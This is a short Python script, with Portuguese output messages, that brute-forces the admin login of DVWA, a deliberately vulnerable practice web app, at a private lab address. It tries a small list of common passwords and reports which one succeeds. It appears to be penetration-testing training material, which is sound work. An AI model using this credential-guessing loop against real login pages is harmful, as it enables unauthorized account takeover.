import requests

url = "http://192.168.56.101/dvwa/login.php"
user = "admin"
passwords = ["admin", "123456", "password", "dvwa"]

session = requests.Session()
session.get(url)

for pwd in passwords:
    payload = {
        "username": user,
        "password": pwd,
        "Login": "Login"
    }
    response = session.post(url, data=payload)
    if "Login failed" not in response.text:
        print(f"[+] Senha encontrada: {pwd}")
        break
    else:
        print(f"[-] Tentativa falhou: {pwd}")
